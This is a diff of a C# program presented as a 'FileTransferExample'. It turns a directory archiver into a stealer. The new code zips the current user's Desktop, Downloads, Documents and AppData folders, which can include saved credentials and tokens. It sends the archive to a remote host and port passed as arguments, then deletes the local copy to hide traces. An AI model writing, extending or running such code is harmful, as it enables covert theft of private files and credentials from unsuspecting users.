@@ -1,24 +1,56 @@
 using System;
 using System.IO;
-using System.Net.Sockets;
-using System.Text;
 using System.IO.Compression;
+using System.Net.Sockets;
 
 namespace FileTransferExample
 {
     class Program
     {
-        static void CreateRar(string dirPath, string rarPath)
+        static void CreateRar(string rarPath)
         {
-            using (FileStream fsOut = new FileStream(rarPath, FileMode.Create))
+            try
             {
-                using (ZipArchive archive = new ZipArchive(fsOut, ZipArchiveMode.Create))
+                string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+                string desktopPath = Path.Combine(userFolderPath, "Desktop");
+                string downloadPath = Path.Combine(userFolderPath, "Downloads");
+                string documentPath = Path.Combine(userFolderPath, "Documents");
+                string appdataPath = Path.Combine(userFolderPath, "AppData");
+
+                using (FileStream fsOut = new FileStream(rarPath, FileMode.Create))
                 {
-                    foreach (string filePath in Directory.GetFiles(dirPath, "*", SearchOption.AllDirectories))
+                    using (ZipArchive archive = new ZipArchive(fsOut, ZipArchiveMode.Create))
                     {
-                        ZipArchiveEntry entry = archive.CreateEntryFromFile(filePath, filePath.Substring(dirPath.Length + 1));
+                        AddFolderToZip(archive, desktopPath);
+                        AddFolderToZip(archive, downloadPath);
+                        AddFolderToZip(archive, documentPath);
+                        AddFolderToZip(archive, appdataPath);
                     }
                 }
+            }
+            catch (UnauthorizedAccessException ex)
+            {
+                Console.WriteLine($"Unauthorized access exception: {ex.Message}");
+                // Log the exception or handle it as per your application's requirements
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Exception: {ex.Message}");
+                // Handle other exceptions if needed
+            }
+        }
+
+        static void AddFolderToZip(ZipArchive archive, string folderPath)
+        {
+            if (!Directory.Exists(folderPath))
+            {
+                Console.WriteLine($"Directory '{folderPath}' does not exist or access is denied.");
+                return;
+            }
+
+            foreach (string filePath in Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories))
+            {
+                ZipArchiveEntry entry = archive.CreateEntryFromFile(filePath, filePath.Substring(folderPath.Length + 1));
             }
         }
 
@@ -48,21 +80,20 @@ namespace FileTransferExample
 
         static void Main(string[] args)
         {
-            if (args.Length != 3)
+            if (args.Length != 2)
             {
                 Console.WriteLine("Usage: FileTransferExample <host> <port>");
                 return;
             }
 
-            string dirPath = @"C:\Users";
             string rarPath = "snapshot.zip";
             string host = args[0];
             int port = int.Parse(args[1]);
 
-            CreateRar(dirPath, rarPath);
+            CreateRar(rarPath);
             SendFile(host, port, rarPath);
 
-            File.Delete(rarPath);
+            File.Delete(rarPath); // Delete the file after sending
 
             Console.WriteLine("File transfer completed.");
         }
